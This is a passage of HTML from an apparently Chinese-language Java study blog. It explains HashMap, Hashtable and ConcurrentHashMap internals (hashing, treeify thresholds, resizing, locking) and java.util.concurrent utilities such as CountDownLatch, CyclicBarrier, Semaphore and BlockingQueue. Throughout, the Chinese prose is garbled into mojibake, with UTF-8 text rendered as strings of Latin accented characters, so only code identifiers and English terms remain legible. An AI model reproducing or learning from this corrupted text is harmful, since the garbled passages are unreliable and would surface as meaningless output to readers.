å¦‚æœä¸ç›¸ç­‰ï¼Œè®¤ä¸ºä¸¤ä¸ªå¯¹è±¡ä¹Ÿä¸ç›¸ç­‰ï¼Œå®Œæ¯•<br>â€‹        å¦‚æœç›¸ç­‰ï¼Œè½¬å…¥2<br>â€‹      ï¼ˆè¿™ä¸€ç‚¹åªæ˜¯ä¸ºäº†æé«˜å­˜å‚¨æ•ˆç‡è€Œè¦æ±‚çš„ï¼Œå…¶å®ç†è®ºä¸Šæ²¡æœ‰ä¹Ÿå¯ä»¥ï¼Œä½†å¦‚æœæ²¡æœ‰ï¼Œå®é™…ä½¿ç”¨æ—¶æ•ˆç‡ä¼šå¤§å¤§é™ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°†å…¶åšä¸ºå¿…éœ€çš„ã€‚ï¼‰</p><p>â€‹     2.åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡ç”¨equalsè¿ç®—æ˜¯å¦ç›¸ç­‰<br>â€‹       å¦‚æœä¸ç›¸ç­‰ï¼Œè®¤ä¸ºä¸¤ä¸ªå¯¹è±¡ä¹Ÿä¸ç›¸ç­‰<br>â€‹       å¦‚æœç›¸ç­‰ï¼Œè®¤ä¸ºä¸¤ä¸ªå¯¹è±¡ç›¸ç­‰ï¼ˆequals()æ˜¯åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰çš„å…³é”®ï¼‰<br>â€‹       ä¸ºä»€ä¹ˆæ˜¯ä¸¤æ¡å‡†åˆ™ï¼Œéš¾é“ç”¨ç¬¬ä¸€æ¡ä¸è¡Œå—ï¼Ÿä¸è¡Œï¼Œå› ä¸ºå‰é¢å·²ç»è¯´äº†ï¼Œhashcode()ç›¸ç­‰æ—¶ï¼Œequals()æ–¹æ³•ä¹Ÿå¯èƒ½ä¸ç­‰ï¼Œæ‰€ä»¥å¿…é¡»ç”¨ç¬¬2æ¡å‡†åˆ™è¿›è¡Œé™åˆ¶ï¼Œæ‰èƒ½ä¿è¯åŠ å…¥çš„ä¸ºéé‡å¤å…ƒç´ ã€‚</p><p>Mapä¸­çš„Keyæ˜¯ç”¨setç»„æˆçš„ï¼Œvalueæ˜¯ç”¨collectionç»„ç»‡èµ·æ¥çš„ã€‚</p><p> <img src="/2020/03/31/Java-jar/image-20200331182620663.png"></p><h3><span id="hashmap-hashtable-concurrenthashmapçš„åŒºåˆ«">HashMap HashTable ConcurrentHashMapçš„åŒºåˆ«</span></h3><p><img src="/2020/03/31/Java-jar/image-20200331182635063.png"></p><p>é»˜è®¤é•¿åº¦ä¸º16</p><p>å®é™…ä¸Šæ˜¯é€šè¿‡ä½è¿ç®—è€Œä¸æ˜¯å–æ¨¡</p><p><img src="/2020/03/31/Java-jar/image-20200331182648604.png"></p><p>Nodeæ˜¯ç”±hashå€¼ï¼Œé”®å€¼å¯¹å’Œnextç»„æˆçš„ã€‚</p><p>æ•°ç»„åˆ†æˆä¸€ä¸ªä¸ªbucket</p><p>å¦‚æœé“¾è¡¨é•¿åº¦è¶…è¿‡TREEIFY_THRESHOLD&#x3D;8 å°±ä¼šå˜æˆçº¢é»‘æ ‘</p><p>å°‘äºUNTREEIFY_THREHOLD&#x3D;6å°±ä¼šå˜æˆé“¾è¡¨</p><p>HashMapæ˜¯ä½¿ç”¨LazyLoadçš„åŸåˆ™ï¼Œåœ¨é¦–æ¬¡ä½¿ç”¨çš„æ—¶å€™æ‰åˆå§‹åŒ–ã€‚</p><p>Resizeæ–¹æ³•æ—¢å…·å¤‡åˆå§‹åŒ–è¿˜å…·å¤‡æ‰©å®¹çš„ä½œç”¨</p><h3><span id="hashmapputæ–¹æ³•çš„é€»è¾‘">HashMapï¼šputæ–¹æ³•çš„é€»è¾‘</span></h3><ol><li><p>å¦‚æœHashMapæœªè¢«åˆå§‹åŒ–ï¼Œåˆ™resizeåˆå§‹åŒ–</p></li><li><p>å¯¹Keyæ±‚Hashå€¼ï¼Œç„¶åå†è®¡ç®—ä¸‹æ ‡</p></li><li><p>å¦‚æœæ²¡æœ‰ç¢°æ’ï¼Œç›´æ¥æ”¾å…¥æ¡¶ä¸­</p></li><li><p>å¦‚æœç¢°æ’äº†ï¼Œkeyç›¸ç­‰å°±å–å‡ºèŠ‚ç‚¹</p></li><li><p>å¦‚æœæ˜¯çº¢é»‘æ ‘å°±ä»¥çº¢é»‘æ ‘çš„æ–¹å¼æ’å…¥èŠ‚ç‚¹ï¼Œå¦‚æœä¸ºé“¾è¡¨ä»¥é“¾è¡¨çš„æ–¹å¼é“¾æ¥åˆ°åé¢ï¼Œ</p></li><li><p>å¦‚æœæ’å…¥åé“¾è¡¨é•¿åº¦è¶…è¿‡é˜ˆå€¼8ï¼Œå°±æŠŠé“¾è¡¨è½¬æˆçº¢é»‘æ ‘</p></li><li><p>å¦‚æœèŠ‚ç‚¹å·²ç»å­˜åœ¨å°±æ›¿æ¢æ—§å€¼</p></li><li><p>å¦‚æœæ¡¶æ»¡äº†ï¼ˆå®¹é‡16*åŠ è½½å› å­0.75ï¼‰ï¼Œå°±éœ€è¦resizeï¼ˆæ‰©å®¹2å€åé‡æ’ï¼‰</p></li></ol><p>æ¡¶å°±æ˜¯æ•°ç»„</p><p>Resizeåé‡æ–°è®¡ç®—æ¯ä¸ªå…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼ˆè¦ä¹ˆæ˜¯å½“å‰ä½ç½®è¦ä¹ˆæ˜¯å½“å‰ä¸‹æ ‡+oldCapï¼‰</p><p><img src="/2020/03/31/Java-jar/image-20200403163716667.png"></p><h3><span id="hashmapgetæ–¹æ³•çš„é€»è¾‘">HashMapï¼šgetæ–¹æ³•çš„é€»è¾‘</span></h3><ul><li>è®¡ç®— key çš„ hash å€¼ï¼Œæ ¹æ® hash å€¼æ‰¾åˆ°å¯¹åº”æ•°ç»„ä¸‹æ ‡:     hash &amp; (length-1)</li><li>åˆ¤æ–­æ•°ç»„è¯¥ä½ç½®å¤„çš„å…ƒç´ æ˜¯å¦åˆšå¥½å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„</li><li>å¦‚æœä¸æ˜¯ï¼Œåˆ¤æ–­è¯¥å…ƒç´ ç±»å‹æ˜¯å¦æ˜¯ TreeNodeï¼Œå¦‚æœæ˜¯ï¼Œç”¨çº¢é»‘æ ‘çš„æ–¹æ³•å–æ•°æ®ã€‚</li><li>å¦‚æœä¸æ˜¯ï¼Œéå†é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸ç­‰(&#x3D;&#x3D;æˆ–equals)çš„ keyã€‚</li></ul><p>æ‰©å®¹<img src="/2020/03/31/Java-jar/image-20200403163829060.png"></p><h3><span id="hashmapå¦‚ä½•æœ‰æ•ˆå‡å°‘ç¢°æ’">HashMapï¼šå¦‚ä½•æœ‰æ•ˆå‡å°‘ç¢°æ’</span></h3><p>Ã˜ æ‰°åŠ¨å‡½æ•°ï¼šä¿ƒä½¿å…ƒç´ ä½ç½®åˆ†å¸ƒå‡åŒ€ï¼Œå‡å°‘ç¢°æ’å‡ ç‡</p><p>Ã˜ ä½¿ç”¨finalå¯¹è±¡ï¼Œå¹¶é‡‡ç”¨åˆé€‚çš„equals()å’ŒhashCode()æ–¹æ³•</p><h3><span id="ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨hashcodeä½œä¸ºä¸‹æ ‡">ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨hashcodeä½œä¸ºä¸‹æ ‡</span></h3><p><img src="/2020/03/31/Java-jar/image-20200403164018087.png">         </p><p>ç›´æ¥ç”¨hashCodeä½œä¸ºä¸‹æ ‡çš„è¯å¤ªæµªè´¹ç©ºé—´ï¼Œæœ‰40äº¿çš„ç©ºé—´å†…å­˜æ”¾ä¸ä¸‹è¿™ä¹ˆå¤§çš„æ•°ç»„ä¸”æ‰©å®¹å‰æ•°ç»„é»˜è®¤å¤§å°æ‰16ã€‚æ··åˆåŸå§‹hashCodeçš„é«˜ä½å’Œä½ä½ï¼ŒåŠ å¤§éšæœºæ€§åŒæ—¶èƒ½å¾—åˆ°é«˜ä½ä½çš„ç‰¹å¾ï¼Œåœ¨æ•°ç»„lengthè¾ƒå°çš„æ—¶å€™ä¹Ÿèƒ½ä¿è¯é«˜ä½ä½å‚ä¸hashè¿ç®—å½“ä¸­ï¼Œä¹Ÿä¸ä¼šæœ‰å¤ªå¤§å¼€é”€ã€‚æœ€åç”¨ä½ä¸çš„æ“ä½œæ¥æ›¿ä»£å–æ¨¡è¾¾åˆ°æ›´é«˜æ•ˆç‡ã€‚ï¼ˆå› ä¸ºHashMapçš„é•¿åº¦æ˜¯2çš„næ¬¡æ–¹ï¼Œå› æ­¤å¯ä»¥ç”¨å–æ¨¡æ¥æ›¿ä»£ï¼‰</p><p> <img src="/2020/03/31/Java-jar/image-20200403164029114.png"></p><p>æ‰©å®¹å› å­æ˜¯0.75ï¼Œå½“hashmapå¡«æ»¡ç™¾åˆ†ä¹‹75çš„bucketçš„æ—¶å€™ï¼Œå°†ä¼šåˆ›å»ºåŸæ¥hashMap 2å€å¤§å°çš„æ•°ç»„ï¼Œå¹¶å°†åŸæ¥çš„å¯¹è±¡è½¬ç§»è¿‡å»ã€‚è¿™éƒ¨å«åšrehashingã€‚</p><h3><span id="hashmapæ‰©å®¹é—®é¢˜">HashMapï¼šæ‰©å®¹é—®é¢˜</span></h3><p>Ã˜ å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œè°ƒæ•´å¤§å°ä¼šå­˜åœ¨æ¡ä»¶ç«äº‰ï¼Œå®¹æ˜“é€ æˆæ­»é”</p><p>Ã˜ Rehashingæ˜¯ä¸€ä¸ªæ¯”è¾ƒè€—æ—¶çš„è¿‡ç¨‹</p><p> ç”±äºHashMapä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå› æ­¤ä¸ºäº†ä½¿å¾—å…¶å˜æˆçº¿ç¨‹å®‰å…¨çš„å¯ä»¥ä½¿ç”¨</p><h3><span id="collectionssynchronizedmapå’Œhashtableçš„åŒºåˆ«">Collections.synchronizedMapå’ŒHashtableçš„åŒºåˆ«</span></h3><p>åœ¨synchronizedMapä¸­æœ‰ä¸ªObjectç±»å‹çš„äº’æ–¥æˆå‘˜ï¼Œç„¶åä½¿ç”¨synchronizedå…³é”®å­—ä¿®é¥°</p><p>SynchronizedMapçš„åŸç†å‡ ä¹å’ŒHashtableçš„å®ç°ä¸€è‡´ï¼Œhashtableå°†publicçš„æ–¹æ³•éƒ½æ·»åŠ äº†synchronizedå…³é”®å­—ã€‚å”¯ä¸€åŒºåˆ«å°±æ˜¯<font color="orange">é”å®šçš„å¯¹è±¡ä¸ä¸€è‡´ã€‚</font></p><p>Hashtableè·å–çš„æ˜¯æ–¹æ³•è°ƒç”¨è€…thisçš„é”ï¼Œè€ŒsynchronizedMapæ˜¯ä½¿ç”¨å®šä¹‰å¥½çš„æˆå‘˜å˜é‡mutexã€‚</p><p>ç”±äºè¿™ä¸¤è€…åœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹æ˜¯<font color="orange">ä¸²è¡Œæ‰§è¡Œçš„ï¼Œæ•ˆç‡æ¯”è¾ƒä½</font>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ConcurrentHashMap</p><p><img src="/2020/03/31/Java-jar/image-20200403164302476.png"></p><p>ç°åœ¨åšæ³•ï¼šåªé”å®šå½“å‰é“¾è¡¨æˆ–è€…çº¢é»‘æ ‘çš„é¦–èŠ‚ç‚¹ã€‚</p><p><img src="/2020/03/31/Java-jar/image-20200403164412266.png"></p><p>ConcurrentHashMapä¸å…è®¸æ’å…¥null keyï¼Œè€ŒHashMapå¯ä»¥ã€‚</p><h3><span id="concurrenthashmapputæ–¹æ³•çš„é€»è¾‘">ConcurrentHashMapï¼šputæ–¹æ³•çš„é€»è¾‘</span></h3><ol><li><p>åˆ¤æ–­Node[]æ•°ç»„æ˜¯å¦åˆå§‹åŒ–ï¼Œæ²¡æœ‰åˆ™è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</p></li><li><p>é€šè¿‡hashå®šä½æ•°ç»„çš„ç´¢å¼•åæ ‡ï¼Œæ˜¯å¦æœ‰NodeèŠ‚ç‚¹ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä½¿ç”¨CASè¿›è¡Œæ·»åŠ ï¼ˆé“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼‰ï¼Œæ·»åŠ å¤±è´¥åˆ™è¿›å…¥ä¸‹æ¬¡å¾ªç¯ã€‚</p></li><li><p>å¦‚æœhashä¸ºMOVEDæ£€æŸ¥åˆ°å†…éƒ¨æ­£åœ¨æ‰©å®¹ï¼Œå°±å¸®åŠ©å®ƒä¸€å—æ‰©å®¹ã€‚</p></li><li><p>å¦‚æœf!&#x3D;nullï¼Œåˆ™ä½¿ç”¨synchronizedé”ä½få…ƒç´ ï¼ˆé“¾è¡¨&#x2F;çº¢é»‘äºŒå‰æ ‘çš„å¤´å…ƒç´ ï¼‰</p><p>a)   å¦‚æœæ˜¯Nodeï¼ˆé“¾è¡¨ç»“æ„ï¼‰åˆ™æ‰§è¡Œé“¾è¡¨çš„æ·»åŠ æ“ä½œã€‚</p><p>b)   å¦‚æœæ˜¯TreeNodeï¼ˆæ ‘å‹ç»“æ„ï¼‰åˆ™æ‰§è¡Œæ ‘æ·»åŠ æ“ä½œã€‚</p><p>c)   å¦‚æœæ˜¯reservationNodeå°±æŠ›å‡ºå¼‚å¸¸ã€‚</p></li><li><p>åˆ¤æ–­é“¾è¡¨é•¿åº¦å·²ç»è¾¾åˆ°ä¸´ç•Œå€¼8ï¼Œå½“ç„¶è¿™ä¸ª8æ˜¯é»˜è®¤å€¼ï¼Œä¹Ÿå¯ä»¥å»è°ƒæ•´ï¼Œå½“èŠ‚ç‚¹æ•°è¶…è¿‡è¿™ä¸ªå€¼å°±éœ€è¦æŠŠé“¾è¡¨è½¬æ¢ä¸ºæ ‘ç»“æ„ã€‚</p></li><li><p>åˆ¤æ–­æ•°ç»„æ˜¯å¦éœ€è¦æ‰©å®¹ã€‚</p></li></ol><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><ul><li>è®¡ç®— hash å€¼</li><li>æ ¹æ® hash å€¼æ‰¾åˆ°æ•°ç»„å¯¹åº”ä½ç½®: (n - 1) &amp; h</li><li>æ ¹æ®è¯¥ä½ç½®å¤„ç»“ç‚¹æ€§è´¨è¿›è¡Œç›¸åº”æŸ¥æ‰¾</li></ul><p>Â·     å¦‚æœè¯¥ä½ç½®ä¸º nullï¼Œé‚£ä¹ˆç›´æ¥è¿”å› null å°±å¯ä»¥äº†</p><p>Â·     å¦‚æœè¯¥ä½ç½®å¤„çš„èŠ‚ç‚¹åˆšå¥½å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œè¿”å›è¯¥èŠ‚ç‚¹çš„å€¼å³å¯</p><p>Â·     å¦‚æœè¯¥ä½ç½®èŠ‚ç‚¹çš„ hash å€¼å°äº 0ï¼Œè¯´æ˜æ­£åœ¨æ‰©å®¹ï¼Œæˆ–è€…æ˜¯çº¢é»‘æ ‘ï¼Œ</p><p>Â·     å¦‚æœä»¥ä¸Š 3 æ¡éƒ½ä¸æ»¡è¶³ï¼Œé‚£å°±æ˜¯é“¾è¡¨ï¼Œè¿›è¡Œéå†æ¯”å¯¹å³å¯</p><p>transient volatile int sizeCtlï¼šæ•£åˆ—è¡¨åˆå§‹åŒ–å’Œæ‰©å®¹çš„å¤§å°éƒ½æ˜¯ç”±è¯¥å˜é‡æ¥æ§åˆ¶ã€‚</p><p>Â·      å½“ä¸ºè´Ÿæ•°æ—¶ï¼Œå®ƒæ­£åœ¨è¢«åˆå§‹åŒ–æˆ–è€…æ‰©å®¹ã€‚</p><p>Â·     -1è¡¨ç¤ºæ­£åœ¨åˆå§‹åŒ–</p><p>Â·     -Nè¡¨ç¤ºN-1ä¸ªçº¿ç¨‹æ­£åœ¨æ‰©å®¹</p><h3><span id="concurrenthashmapæ€»ç»“æ¯”èµ·segmenté”æ‹†å¾—æ›´ç»†">ConcurrentHashMapæ€»ç»“ï¼šæ¯”èµ·Segmentï¼Œé”æ‹†å¾—æ›´ç»†</span></h3><p>Ã˜ é¦–å…ˆä½¿ç”¨æ— é”æ“ä½œCASæ’å…¥å¤´èŠ‚ç‚¹ï¼Œå¤±è´¥åˆ™å¾ªç¯é‡è¯•</p><p>Ã˜ è‹¥å¤´èŠ‚ç‚¹å·²å­˜åœ¨ï¼Œåˆ™å°è¯•è·å–å¤´èŠ‚ç‚¹çš„åŒæ­¥é”ï¼Œå†è¿›è¡Œæ“ä½œ</p><h3><span id="concurrenthashmapåˆ«çš„éœ€è¦æ³¨æ„çš„ç‚¹">ConcurrentHashMapï¼šåˆ«çš„éœ€è¦æ³¨æ„çš„ç‚¹</span></h3><p>Ã˜ size()æ–¹æ³•å’ŒmappingCount()æ–¹æ³•çš„å¼‚åŒï¼Œä¸¤è€…è®¡ç®—æ˜¯å¦å‡†ç¡®ï¼Ÿ</p><p>Ã˜ å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œæ‰©å®¹</p><h3><span id="ä¸‰è€…çš„åŒºåˆ«">ä¸‰è€…çš„åŒºåˆ«</span></h3><p>Ã˜ HashMapçº¿ç¨‹ä¸å®‰å…¨ï¼Œæ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘</p><p>Ã˜ Hashtableçº¿ç¨‹å®‰å…¨ï¼Œé”ä½æ•´ä¸ªå¯¹è±¡ï¼Œæ•°ç»„+é“¾è¡¨</p><p>Ã˜ ConcurrentHashMapçº¿ç¨‹å®‰å…¨ï¼ŒCAS+åŒæ­¥é”ï¼Œæ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘</p><p>Ã˜ HashMapçš„keyã€valueå‡å¯ä¸ºnullï¼Œè€Œå…¶ä»–çš„ä¸¤ä¸ªç±»ä¸æ”¯æŒ</p><h2><span id="java-util-concurrentjuc">Java util concurrentï¼ˆJUCï¼‰</span></h2><h3><span id="javautilconcurrentæä¾›äº†å¹¶å‘ç¼–ç¨‹çš„è§£å†³æ–¹æ¡ˆ">Java.util.concurrent:æä¾›äº†å¹¶å‘ç¼–ç¨‹çš„è§£å†³æ–¹æ¡ˆ</span></h3><p>Ã˜ CASæ˜¯java.util.concurrent.atomicåŒ…çš„åŸºç¡€</p><p>Ã˜ AQSæ˜¯java.util.concurrent.locksåŒ…ä»¥åŠä¸€äº›å¸¸ç”¨ç±»æ¯”å¦‚Samophoreï¼ŒReentrantLockç­‰ç±»çš„åŸºç¡€</p><h3><span id="jucåŒ…çš„åˆ†ç±»">J.U.CåŒ…çš„åˆ†ç±»</span></h3><p>Ã˜ çº¿ç¨‹æ‰§è¡Œå™¨executor</p><p>Ã˜ é”locks</p><p>Ã˜ åŸå­å˜é‡ç±»atomic</p><p>Ã˜ å¹¶å‘å·¥å…·ç±»tools</p><p>Ã˜ å¹¶å‘é›†åˆcollections</p><p><img src="/2020/03/31/Java-jar/image-20200403164644589.png"></p><h3><span id="å¹¶å‘å·¥å…·ç±»">å¹¶å‘å·¥å…·ç±»</span></h3><p>Ã˜ é—­é”CountDownLatch</p><p>Ã˜ æ …æ CyclicBarrier</p><p>Ã˜ ä¿¡å·é‡Semaphore</p><p>Ã˜ äº¤æ¢å™¨Exchanger</p><h4><span id="countdownlatchè®©ä¸»çº¿ç¨‹ç­‰å¾…ä¸€ç»„äº‹ä»¶å‘ç”Ÿåç»§ç»­æ‰§è¡Œ">CountDownLatchï¼šè®©ä¸»çº¿ç¨‹ç­‰å¾…ä¸€ç»„äº‹ä»¶å‘ç”Ÿåç»§ç»­æ‰§è¡Œ</span></h4><p>Ã˜ äº‹ä»¶æŒ‡çš„æ˜¯CountDownLatché‡Œçš„countDown()æ–¹æ³•</p><p>â€‹     <img src="/2020/03/31/Java-jar/image-20200403164732266.png"></p><p>å…¶ä»–çº¿ç¨‹ä½¿ç”¨countDownåè¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œå¹¶ä¸ä»£è¡¨è¯¥å­çº¿ç¨‹å·²ç»æ‰§è¡Œå®Œæ¯•äº†ï¼Œè€Œæ˜¯å‘Šè¯‰ä¸»çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚æ¯æ¬¡è°ƒç”¨countDownçš„æ—¶å€™cntéƒ½ä¼š-1ï¼›</p><p> <img src="/2020/03/31/Java-jar/image-20200403164739889.png"></p><h4><span id="cyclicbarrieré˜»å¡å½“å‰çº¿ç¨‹ç­‰å¾…å…¶ä»–çº¿ç¨‹">CyclicBarrierï¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹</span></h4><p>Ã˜ ç­‰å¾…å…¶å®ƒçº¿ç¨‹ï¼Œä¸”ä¼šé˜»å¡è‡ªå·±å½“å‰çº¿ç¨‹ï¼Œæ‰€æœ‰çº¿ç¨‹å¿…é¡»åŒæ—¶åˆ°è¾¾æ …æ ä½ç½®åï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼›</p><p>Ã˜ æ‰€æœ‰çº¿ç¨‹åˆ°è¾¾æ …æ å¤„ï¼Œå¯ä»¥è§¦å‘æ‰§è¡Œå¦å¤–ä¸€ä¸ªé¢„å…ˆè®¾ç½®çš„çº¿ç¨‹</p><p> <img src="/2020/03/31/Java-jar/image-20200403164751372.png"></p><p>æ¯ä¸ªçº¿ç¨‹è°ƒç”¨await()çš„æ—¶å€™ï¼Œcntä¼šå‡ä¸€ï¼Œå½“cntä¸ä¸º0çš„æ—¶å€™ï¼Œä¼šé˜»å¡ã€‚å½“cnt&#x3D;0ï¼Œå³æ‰€æœ‰çº¿ç¨‹éƒ½è°ƒç”¨äº†await()ï¼ŒTaä¸»çº¿ç¨‹æ‰ä¼šå’Œt1 t2 t3ä¸€èµ·æ‰§è¡Œã€‚</p><p> <img src="/2020/03/31/Java-jar/image-20200403164805834.png"></p><h4><span id="semaphoreæ§åˆ¶æŸä¸ªèµ„æºå¯è¢«åŒæ—¶è®¿é—®çš„çº¿ç¨‹ä¸ªæ•°">Semaphoreï¼šæ§åˆ¶æŸä¸ªèµ„æºå¯è¢«åŒæ—¶è®¿é—®çš„çº¿ç¨‹ä¸ªæ•°</span></h4><p><img src="/2020/03/31/Java-jar/image-20200403165110119.png"></p><p>Â· Semaphore ç±»æ˜¯ä¸€ä¸ªè®¡æ•°ä¿¡å·é‡ï¼Œå¿…é¡»ç”±è·å–å®ƒçš„çº¿ç¨‹é‡Šæ”¾ï¼Œ é€šå¸¸ç”¨äºé™åˆ¶å¯ä»¥è®¿é—®æŸäº›èµ„æºï¼ˆç‰©ç†æˆ–é€»è¾‘çš„ï¼‰çº¿ç¨‹æ•°ç›®ã€‚ </p><p>Â· ä¸€ä¸ªä¿¡å·é‡æœ‰ä¸”ä»…æœ‰ 3 ç§æ“ä½œï¼Œä¸”å®ƒä»¬å…¨éƒ¨æ˜¯åŸå­çš„ã€‚ </p><ul><li>åˆå§‹åŒ–ã€å¢åŠ å’Œå‡å°‘ã€‚</li><li>å¢åŠ å¯ä»¥ä¸ºä¸€ä¸ªè¿›ç¨‹è§£é™¤é˜»å¡ã€‚</li><li>å‡å°‘å¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹è¿›å…¥é˜»å¡ã€‚</li></ul><p>Â· Semaphore ç®¡ç†ä¸€ç³»åˆ—è®¸å¯è¯ã€‚ </p><ul><li>æ¯ä¸ª     acquire() æ–¹æ³•é˜»å¡ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªè®¸å¯è¯å¯ä»¥è·å¾—ç„¶åæ‹¿èµ°ä¸€ä¸ªè®¸å¯è¯ã€‚</li><li>æ¯ä¸ª     release() æ–¹æ³•å¢åŠ ä¸€ä¸ªè®¸å¯è¯ï¼Œè¿™å¯èƒ½ä¼šé‡Šæ”¾ä¸€ä¸ªé˜»å¡çš„ acquire() æ–¹æ³•ã€‚</li><li>ä¸ä½¿ç”¨å®é™…çš„è®¸å¯å¯¹è±¡ï¼ŒSemaphore     åªå¯¹å¯ç”¨è®¸å¯çš„å·ç è¿›è¡Œè®¡æ•°ï¼Œå¹¶é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚</li></ul><p>Â· Semaphore åœ¨è®¡æ•°å™¨ä¸ä¸º 0 çš„æ—¶å€™å¯¹çº¿ç¨‹å°±æ”¾è¡Œï¼Œä¸€æ—¦è¾¾åˆ° 0ï¼Œé‚£ä¹ˆæ‰€æœ‰è¯·æ±‚èµ„æºçš„æ–°çº¿ç¨‹éƒ½ä¼šè¢«é˜»å¡ï¼ŒåŒ…æ‹¬å¢åŠ è¯·æ±‚åˆ°è®¸å¯çš„çº¿ç¨‹ï¼ŒSemaphore æ˜¯<font color="orange">ä¸å¯é‡å…¥çš„</font>ã€‚</p><ul><li>æ¯ä¸€æ¬¡è¯·æ±‚ä¸€ä¸ªè®¸å¯éƒ½ä¼šå¯¼è‡´è®¡æ•°å™¨å‡å°‘ 1ï¼ŒåŒæ ·æ¯æ¬¡é‡Šæ”¾ä¸€ä¸ªè®¸å¯éƒ½ä¼šå¯¼è‡´è®¡æ•°å™¨å¢åŠ  1ï¼Œä¸€æ—¦è¾¾åˆ° 0ï¼Œæ–°çš„è®¸å¯è¯·æ±‚çº¿ç¨‹å°†è¢«æŒ‚èµ·ã€‚</li></ul><p>Â· Semaphore æœ‰ä¸¤ç§æ¨¡å¼ï¼Œ<strong>å…¬å¹³æ¨¡å¼</strong> å’Œ <strong>éå…¬å¹³æ¨¡å¼</strong>ã€‚ </p><ul><li>å…¬å¹³æ¨¡å¼å°±æ˜¯è°ƒç”¨     acquire çš„é¡ºåºå°±æ˜¯è·å–è®¸å¯è¯çš„é¡ºåºï¼Œéµå¾ª FIFOã€‚</li><li>éå…¬å¹³æ¨¡å¼æ˜¯æŠ¢å å¼çš„ï¼Œä¹Ÿå°±æ˜¯æœ‰å¯èƒ½ä¸€ä¸ªæ–°çš„è·å–çº¿ç¨‹æ°å¥½åœ¨ä¸€ä¸ªè®¸å¯è¯é‡Šæ”¾æ—¶å¾—åˆ°äº†è¿™ä¸ªè®¸å¯è¯ï¼Œè€Œå‰é¢è¿˜æœ‰ç­‰å¾…çš„çº¿ç¨‹ã€‚</li></ul><p> <img src="/2020/03/31/Java-jar/image-20200403165155908.png"></p><h4><span id="exchangerä¸¤ä¸ªçº¿ç¨‹åˆ°è¾¾åŒæ­¥ç‚¹åç›¸äº’äº¤æ¢æ•°æ®">Exchangerï¼šä¸¤ä¸ªçº¿ç¨‹åˆ°è¾¾åŒæ­¥ç‚¹åï¼Œç›¸äº’äº¤æ¢æ•°æ®</span></h4><p> <img src="/2020/03/31/Java-jar/image-20200403165216566.png"></p><p> <img src="/2020/03/31/Java-jar/image-20200403165226727.png"></p><p><img src="/2020/03/31/Java-jar/image-20200403165237352.png"></p><h3><span id="blockingqueueæä¾›å¯é˜»å¡çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ">BlockingQueueï¼šæä¾›å¯é˜»å¡çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ</span></h3><p> <img src="/2020/03/31/Java-jar/image-20200403165244330.png"></p><p><strong>ä¸»è¦ç”¨äºç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼Œåœ¨å¤šçº¿ç¨‹åœºæ™¯æ—¶ç”Ÿäº§è€…çº¿ç¨‹åœ¨é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼Œè€Œæ¶ˆè´¹è€…çº¿ç¨‹åˆ™åœ¨é˜Ÿåˆ—å¤´éƒ¨æ¶ˆè´¹å…ƒç´ ï¼Œé€šè¿‡è¿™ç§æ–¹å¼èƒ½å¤Ÿè¾¾åˆ°å°†ä»»åŠ¡çš„ç”Ÿäº§å’Œæ¶ˆè´¹è¿›è¡Œéš”ç¦»çš„ç›®çš„</strong></p><p>å¦‚æœé˜Ÿåˆ—æ»¡äº†ï¼Œå…¥é˜Ÿæ“ä½œå°†é˜»å¡ï¼Œå¦‚æœé˜Ÿåˆ—ç©ºäº†ï¼Œå‡ºé˜Ÿæ“ä½œå°†é˜»å¡ã€‚</p><p>Add()å¾€é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥æŠ›å‡ºIllegalStateException</p><p>Put()å¾€é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼Œå¦‚æœé˜Ÿåˆ—æ»¡äº†åˆ™é˜»å¡å½“å‰çº¿ç¨‹ç›´åˆ°èƒ½å¤Ÿæ·»åŠ æˆåŠŸä¸ºæ­¢</p><p>Offer()å¾€é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false</p><p>Offerè¿˜èƒ½ä¼ å‚ï¼ŒæŒ‡å®štimeoutï¼Œå¦‚æœè¶…è¿‡timeoutçš„è¯å°±ä¼šè¿”å›falseï¼Œè¢«ä¸­æ–­å°±ä¼šæŠ›å‡ºInterruptedException </p><p>Takeæ˜¯ä»é˜Ÿåˆ—å¤´éƒ¨å–å‡ºå…ƒç´ ï¼Œå¦‚æœå…ƒç´ ä¸ºç©ºåˆ™ä¸€ç›´ç­‰å¾…æœ‰å…ƒç´ 